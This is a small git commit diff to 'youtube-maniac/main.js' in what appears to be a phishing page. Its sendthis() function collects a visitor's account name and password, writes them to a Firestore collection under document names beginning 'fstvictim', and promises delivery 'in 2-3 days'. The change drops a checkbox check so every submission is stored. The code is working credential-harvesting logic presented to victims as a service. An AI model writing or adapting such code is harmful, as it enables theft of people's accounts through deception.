6ccbf37e57e078006406d327890a9a652ce3f94a
M Shameel Kv <shameelkv1911@gmail.com>
2018-12-02 12:30:31 +0530

    some changes

--- youtube-maniac/main.js
+++ youtube-maniac/main.js
@@ -12,10 +12,9 @@ function sendthis(){
 	var name = document.getElementById("name").value;
 	var pass = document.getElementById("pass").value;
 	var vid = document.getElementById("vid").value;
-	var check = document.getElementById("cBox").checked;
 
 	data = {accname:name,accpass:pass}
-	if (name !== null && vid !== null && pass !== null && check )
+	if (name !== null && vid !== null && pass !== null )
 	{
 		db.collection("data").doc("fstvictim "+Math.floor(100*Math.random())).set(data);
 		document.getElementById("t").innerHTML = "You will recieve this in 2-3 days";
